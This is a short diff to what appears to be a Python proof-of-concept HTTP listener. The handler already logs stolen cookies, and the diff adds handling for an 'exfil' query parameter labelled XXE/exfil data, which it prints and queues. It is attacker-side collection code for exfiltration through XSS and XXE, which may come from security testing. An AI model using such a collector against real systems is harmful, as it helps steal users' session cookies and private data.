@@ -126,6 +126,12 @@ class POCHTTPHandler(SimpleHTTPRequestHandler):
                 out.success(f"🍪 COOKIE (raw): {cookie_data}")
                 event_queue.put({'type': 'cookie', 'data': cookie_data, 'raw': cookie_data, 'timestamp': datetime.now().isoformat()})
 
+        # Check for XXE/exfil data
+        if 'exfil' in query_params:
+            exfil_data = query_params['exfil'][0] if query_params['exfil'] else ''
+            out.success(f"📤 EXFIL DATA: {exfil_data[:200]}...")  # Show first 200 chars
+            event_queue.put({'type': 'exfil', 'data': exfil_data, 'timestamp': datetime.now().isoformat()})
+
     def log_message(self, format, *args):
         # Suppress default logging
         pass
